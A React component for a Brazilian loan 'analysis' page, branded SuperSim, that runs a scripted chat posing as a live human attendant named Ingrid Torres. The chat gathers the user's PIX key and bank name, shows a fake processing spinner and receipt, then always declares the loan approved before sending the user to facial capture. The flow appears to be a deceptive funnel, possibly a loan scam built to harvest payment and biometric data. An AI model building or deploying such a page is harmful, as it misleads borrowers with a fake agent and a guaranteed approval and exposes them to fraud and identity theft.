import { useEffect, useMemo, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowLeft, Check, Send, Star } from 'lucide-react'
import { Confetti } from '@/components/flow/Confetti'
import { PixReceiptCard } from '@/components/flow/PixReceiptCard'
import { SuperSimLogo } from '@/components/brand/SuperSimLogo'
import { useFlow } from '@/context/FlowContext'
import { useUtmCapture } from '@/hooks/useUtmCapture'
import { displayName } from '@/lib/cpf'
import { buildUrlWithUtms } from '@/lib/utm'
import { formatCurrency } from '@/lib/utils'
import {
  ANALISE_QUESTIONS,
  INSTALLMENT_OPTIONS,
  calcInstallmentValue,
} from '@/mocks/analise-data'
import { BANK_SUGGESTIONS } from '@/mocks/banks-data'
import { cn } from '@/lib/utils'

type ChatPhase =
  | 'intro'
  | 'question'
  | 'pix-input'
  | 'pix-confirm'
  | 'bank-input'
  | 'amount'
  | 'installments'
  | 'receipt'
  | 'confirm-sim'
  | 'analyzing'

interface ChatMessage {
  id: string
  from: 'attendant' | 'user'
  text: string
}

export function AnalisePage() {
  const navigate = useNavigate()
  useUtmCapture()
  const {
    nome,
    cpf,
    loanAmount,
    propostaAccepted,
    analiseData,
    updateAnaliseData,
    completeAnalise,
    setLoanAmount,
  } = useFlow()

  const [messages, setMessages] = useState<ChatMessage[]>([])
  const [phase, setPhase] = useState<ChatPhase>('intro')
  const [questionIndex, setQuestionIndex] = useState(0)
  const [typing, setTyping] = useState(false)
  const [inputValue, setInputValue] = useState('')
  const [tempPixKey, setTempPixKey] = useState('')
  const [amount, setAmount] = useState(loanAmount)
  const [selectedMonths, setSelectedMonths] = useState(0)
  const [selectedMonthly, setSelectedMonthly] = useState(0)
  const [showReceipt, setShowReceipt] = useState(false)
  const [showApproval, setShowApproval] = useState(false)
  const [showLoading, setShowLoading] = useState(false)
  const [simError, setSimError] = useState(false)
  const bottomRef = useRef<HTMLDivElement>(null)

  const bankSuggestions = useMemo(() => {
    if (phase !== 'bank-input' || !inputValue.trim()) return []
    const q = inputValue.toLowerCase()
    return BANK_SUGGESTIONS.filter((b) => b.toLowerCase().includes(q)).slice(0, 5)
  }, [phase, inputValue])

  useEffect(() => {
    if (!cpf || !propostaAccepted) navigate('/proposta')
  }, [cpf, propostaAccepted, navigate])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [messages, typing, phase, showReceipt])

  useEffect(() => {
    if (phase !== 'intro') return
    const timer = setTimeout(() => {
      pushAttendant(
        `Olá ${displayName(nome)}! Para finalizar sua análise, preciso fazer algumas perguntas rápidas. Qual o principal motivo do seu empréstimo?`,
      )
      setPhase('question')
    }, 1200)
    return () => clearTimeout(timer)
  }, [phase, nome])

  function pushMessage(from: ChatMessage['from'], text: string) {
    setMessages((prev) => [...prev, { id: `${Date.now()}-${prev.length}`, from, text }])
  }

  function pushAttendant(text: string) {
    pushMessage('attendant', text)
  }

  function pushUser(text: string) {
    pushMessage('user', text)
  }

  function withTyping(callback: () => void, delay = 900) {
    setTyping(true)
    setTimeout(() => {
      setTyping(false)
      callback()
    }, delay)
  }

  function handleOption(option: string) {
    pushUser(option)
    updateAnaliseData({ answers: [...analiseData.answers, option] })

    const current = ANALISE_QUESTIONS[questionIndex]
    if (current?.type === 'pix') {
      updateAnaliseData({ pixType: option })
      withTyping(() => {
        pushAttendant(`Perfeito! Agora digite sua chave ${option}:`)
        setPhase('pix-input')
      })
      return
    }

    const next = questionIndex + 1
    if (next < ANALISE_QUESTIONS.length) {
      setQuestionIndex(next)
      withTyping(() => pushAttendant(ANALISE_QUESTIONS[next].text), 1100)
      return
    }

    withTyping(() => {
      pushAttendant('Perfeito! Agora me diga: quanto você precisa?')
      setPhase('amount')
    })
  }

  function submitPixKey() {
    const value = inputValue.trim()
    if (!value) return
    setTempPixKey(value)
    pushUser(value)
    setInputValue('')
    withTyping(() => {
      pushAttendant(`Sua chave PIX é:\n\n${value}\n\nEstá correta?`)
      setPhase('pix-confirm')
    })
  }

  function confirmPix(confirmed: boolean) {
    if (confirmed) {
      pushUser('Sim, está correta')
      updateAnaliseData({ pixKey: tempPixKey })
      withTyping(() => {
        pushAttendant('Perfeito! Agora digite o nome do seu banco:')
        setPhase('bank-input')
      })
      return
    }

    pushUser('Não, quero corrigir')
    withTyping(() => {
      pushAttendant(`Ok! Digite novamente sua chave ${analiseData.pixType}:`)
      setPhase('pix-input')
    })
  }

  function submitBank(value?: string) {
    const bank = (value ?? inputValue).trim()
    if (!bank) return
    pushUser(bank)
    updateAnaliseData({ bankName: bank })
    setInputValue('')
    const next = questionIndex + 1
    setQuestionIndex(next)
    withTyping(() => {
      pushAttendant(ANALISE_QUESTIONS[next].text)
      setPhase('question')
    })
  }

  function confirmAmount() {
    pushUser(formatCurrency(amount))
    setLoanAmount(amount)
    withTyping(() => {
      pushAttendant('Ótimo! Agora escolha em quantas vezes você quer pagar:')
      setPhase('installments')
    })
  }

  function selectInstallment(months: number) {
    const monthly = calcInstallmentValue(amount, months)
    setSelectedMonths(months)
    setSelectedMonthly(monthly)
    updateAnaliseData({
      selectedInstallments: months,
      selectedMonthlyPayment: monthly,
    })
    pushUser(`${months}x de ${formatCurrency(monthly)}`)
    setPhase('receipt')
    withTyping(() => {
      pushAttendant('Perfeito! Vou processar o pagamento agora...')
      setTimeout(() => {
        setShowReceipt(true)
        withTyping(() => {
          pushAttendant('Confirme digitando "SIM" para finalizar sua solicitação:')
          setPhase('confirm-sim')
        }, 1500)
      }, 1500)
    }, 1000)
  }

  function submitSim() {
    if (inputValue.trim().toUpperCase() !== 'SIM') {
      setSimError(true)
      return
    }
    setSimError(false)
    pushUser('SIM')
    setInputValue('')
    setPhase('analyzing')
    withTyping(() => {
      pushAttendant('Perfeito! Agora vou finalizar sua análise...')
      setShowLoading(true)
      setTimeout(() => {
        setShowLoading(false)
        completeAnalise()
        setShowApproval(true)
      }, 2800)
    }, 1000)
  }

  const firstPayment = new Date()
  firstPayment.setDate(firstPayment.getDate() + 90)
  const diffDays = Math.ceil((firstPayment.getTime() - Date.now()) / (1000 * 60 * 60 * 24))

  if (showApproval) {
    return (
      <div className="relative min-h-dvh bg-bg-app px-4 py-6">
        <Confetti />
        <div className="relative mx-auto max-w-[420px] overflow-hidden rounded-[18px] border border-border bg-white shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
          <div className="bg-gradient-to-br from-primary to-primary-dark px-6 py-8 text-center text-white">
            <div className="mb-4 flex items-center justify-center gap-2">
              <SuperSimLogo height={28} className="brightness-0 invert" />
              <span className="rounded-full bg-white/20 px-2.5 py-1 text-[11px] font-bold">Aprovado</span>
            </div>
            <div className="mx-auto mb-4 flex size-16 items-center justify-center rounded-full bg-white/20">
              <Check className="size-8" strokeWidth={3} />
            </div>
            <h2 className="text-xl font-bold">Parabéns, {displayName(nome)}!</h2>
            <p className="mt-1 text-sm font-semibold text-primary-light">Empréstimo APROVADO!</p>
          </div>

          <div className="space-y-4 p-6">
            <p className="text-center text-sm text-text-mid">O valor já está reservado para você.</p>
            <div className="rounded-xl border border-primary/20 bg-primary-subtle p-4 text-center">
              <p className="text-[11px] font-bold uppercase tracking-wide text-text-light">Valor liberado</p>
              <p className="text-3xl font-extrabold text-primary-dark">{formatCurrency(amount)}</p>
              <p className="text-xs text-text-light">Recebimento via PIX</p>
            </div>
            <div className="grid grid-cols-2 gap-3">
              <div className="rounded-xl border border-border bg-[#F9FAFB] p-3 text-center">
                <p className="text-[10px] font-bold uppercase text-text-light">Parcela mensal</p>
                <p className="text-base font-bold text-text">{formatCurrency(selectedMonthly)}</p>
              </div>
              <div className="rounded-xl border border-border bg-[#F9FAFB] p-3 text-center">
                <p className="text-[10px] font-bold uppercase text-text-light">Parcelas</p>
                <p className="text-base font-bold text-text">{selectedMonths}x</p>
              </div>
            </div>
            <div className="rounded-xl border border-border bg-[#F9FAFB] p-4 text-center">
              <p className="text-[10px] font-bold uppercase text-text-light">Primeira parcela</p>
              <p className="text-lg font-bold text-text">{firstPayment.toLocaleDateString('pt-BR')}</p>
              <p className="text-xs text-text-light">{diffDays} dias para começar a pagar!</p>
            </div>
            <button
              type="button"
              onClick={() => navigate(buildUrlWithUtms('/facial'))}
              className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-br from-primary to-primary-dark px-4 py-4 text-base font-semibold text-white shadow-[0_4px_15px_rgba(251,150,55,0.3)]"
            >
              <Star className="size-5" />
              Finalizar Cadastro
            </button>
            <p className="text-center text-xs text-text-light">
              Complete seu cadastro para acessar sua conta
            </p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="flex h-dvh flex-col bg-[#E5DDD5]">
      <div className="shrink-0 border-b border-[#D1D5DB] bg-white px-4 py-3">
        <div className="mx-auto flex max-w-[420px] items-center gap-3">
          <button
            type="button"
            aria-label="Voltar"
            onClick={() => navigate(-1)}
            className="flex size-9 items-center justify-center rounded-full text-text-mid"
          >
            <ArrowLeft className="size-5" />
          </button>
          <img src="/assets/attendant.png" alt="Ingrid Torres" className="size-10 rounded-full object-cover" />
          <div>
            <h3 className="text-sm font-bold text-text">Ingrid Torres</h3>
            <p className="text-xs text-primary">Online agora</p>
          </div>
        </div>
      </div>

      <div className="mx-auto flex w-full max-w-[420px] flex-1 flex-col overflow-hidden">
        <div className="flex-1 space-y-3 overflow-y-auto px-3 py-4">
          {messages.map((msg) => (
            <div
              key={msg.id}
              className={cn('flex gap-2', msg.from === 'user' ? 'justify-end' : 'justify-start')}
            >
              {msg.from === 'attendant' && (
                <img src="/assets/attendant.png" alt="" className="size-8 shrink-0 rounded-full object-cover" />
              )}
              <div
                className={cn(
                  'max-w-[78%] rounded-2xl px-3.5 py-2.5 text-sm leading-relaxed shadow-sm',
                  msg.from === 'attendant'
                    ? 'rounded-tl-sm bg-white text-text'
                    : 'rounded-tr-sm bg-[#DCF8C6] text-text',
                )}
              >
                {msg.from === 'user' && (
                  <p className="mb-0.5 text-[11px] font-semibold text-primary-dark">{displayName(nome)}</p>
                )}
                <p className="whitespace-pre-line">{msg.text}</p>
              </div>
            </div>
          ))}

          {showReceipt && (
            <PixReceiptCard
              amount={amount}
              nome={nome}
              cpf={cpf}
              pixKey={analiseData.pixKey || tempPixKey}
              bankName={analiseData.bankName}
              installments={selectedMonths}
              monthlyPayment={selectedMonthly}
            />
          )}

          {typing && (
            <div className="flex gap-2">
              <img src="/assets/attendant.png" alt="" className="size-8 rounded-full object-cover" />
              <div className="rounded-2xl rounded-tl-sm bg-white px-4 py-3 shadow-sm">
                <div className="flex gap-1">
                  {[0, 1, 2].map((i) => (
                    <span
                      key={i}
                      className="size-2 animate-bounce rounded-full bg-text-light"
                      style={{ animationDelay: `${i * 150}ms` }}
                    />
                  ))}
                </div>
              </div>
            </div>
          )}

          {phase === 'question' && !typing && questionIndex < ANALISE_QUESTIONS.length && (
            <div className="space-y-2 px-1">
              {ANALISE_QUESTIONS[questionIndex].options.map((option) => (
                <button
                  key={option}
                  type="button"
                  onClick={() => handleOption(option)}
                  className="w-full rounded-xl border border-[#D1D5DB] bg-white px-4 py-3 text-left text-sm font-semibold text-text shadow-sm transition hover:border-primary hover:bg-primary-subtle"
                >
                  {option}
                </button>
              ))}
            </div>
          )}

          {phase === 'pix-confirm' && !typing && (
            <div className="flex gap-2 px-1">
              <button type="button" onClick={() => confirmPix(true)} className="flex-1 rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-white">
                Sim, está correta
              </button>
              <button type="button" onClick={() => confirmPix(false)} className="flex-1 rounded-xl border border-border bg-white px-4 py-3 text-sm font-semibold text-text">
                Não, quero corrigir
              </button>
            </div>
          )}

          {phase === 'amount' && !typing && (
            <div className="mx-1 rounded-2xl border border-border bg-white p-4 shadow-sm">
              <div className="mb-3 flex items-center justify-between">
                <span className="text-sm font-semibold text-text-mid">Valor do empréstimo</span>
                <span className="text-lg font-bold text-primary-dark">{formatCurrency(amount)}</span>
              </div>
              <input type="range" min={1000} max={30000} step={500} value={amount} onChange={(e) => setAmount(Number(e.target.value))} className="w-full accent-primary" />
              <div className="mt-1 flex justify-between text-xs text-text-light">
                <span>R$ 1.000</span>
                <span>R$ 30.000</span>
              </div>
              <button type="button" onClick={confirmAmount} className="mt-4 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-white">
                Confirmar valor
                <Check className="size-4" />
              </button>
            </div>
          )}

          {phase === 'installments' && !typing && (
            <div className="grid grid-cols-2 gap-2 px-1">
              {INSTALLMENT_OPTIONS.map((months) => {
                const monthly = calcInstallmentValue(amount, months)
                const total = monthly * months
                const popular = months === 24
                return (
                  <button
                    key={months}
                    type="button"
                    onClick={() => selectInstallment(months)}
                    className={cn(
                      'relative rounded-xl border-2 bg-white p-3 text-left shadow-sm transition hover:border-primary',
                      popular ? 'border-primary' : 'border-border',
                    )}
                  >
                    {popular && (
                      <span className="absolute right-2 top-2 rounded-full bg-primary px-1.5 py-0.5 text-[9px] font-bold text-white">
                        POPULAR
                      </span>
                    )}
                    <p className="text-lg font-bold text-text">{months}x</p>
                    <p className="text-sm font-semibold text-primary-dark">{formatCurrency(monthly)}</p>
                    <p className="text-[11px] text-text-light">Total: {formatCurrency(total)}</p>
                  </button>
                )
              })}
            </div>
          )}

          <div ref={bottomRef} />
        </div>

        {(phase === 'pix-input' || phase === 'bank-input' || phase === 'confirm-sim') && (
          <div className="relative shrink-0 border-t border-[#D1D5DB] bg-[#F0F2F5] px-3 py-3">
            {phase === 'bank-input' && bankSuggestions.length > 0 && (
              <div className="absolute bottom-full left-3 right-3 mb-1 overflow-hidden rounded-xl border border-border bg-white shadow-lg">
                {bankSuggestions.map((bank) => (
                  <button
                    key={bank}
                    type="button"
                    onClick={() => submitBank(bank)}
                    className="block w-full px-4 py-2.5 text-left text-sm hover:bg-primary-subtle"
                  >
                    {bank}
                  </button>
                ))}
              </div>
            )}
            <div className="flex items-center gap-2">
              <input
                value={inputValue}
                onChange={(e) => {
                  setInputValue(e.target.value)
                  setSimError(false)
                }}
                onKeyDown={(e) => {
                  if (e.key !== 'Enter') return
                  if (phase === 'pix-input') submitPixKey()
                  else if (phase === 'bank-input') submitBank()
                  else submitSim()
                }}
                placeholder={
                  phase === 'pix-input'
                    ? `Digite sua chave ${analiseData.pixType}...`
                    : phase === 'bank-input'
                      ? 'Digite o nome do banco...'
                      : 'Digite SIM para confirmar...'
                }
                className={cn(
                  'flex-1 rounded-full border bg-white px-4 py-2.5 text-sm outline-none focus:border-primary',
                  simError ? 'border-red-400' : 'border-border',
                )}
              />
              <button
                type="button"
                onClick={phase === 'pix-input' ? submitPixKey : phase === 'bank-input' ? () => submitBank() : submitSim}
                className="flex size-10 items-center justify-center rounded-full bg-primary text-white"
              >
                <Send className="size-4" />
              </button>
            </div>
            {simError && <p className="mt-1 text-center text-xs text-red-500">Por favor, digite &quot;SIM&quot; para confirmar</p>}
          </div>
        )}
      </div>

      {showLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
          <div className="rounded-2xl bg-white px-8 py-6 text-center shadow-xl">
            <div className="mx-auto mb-4 size-10 animate-spin rounded-full border-4 border-primary border-t-transparent" />
            <p className="font-semibold text-text">Analisando suas informações...</p>
            <p className="text-sm text-text-light">Aguarde um momento</p>
          </div>
        </div>
      )}
    </div>
  )
}
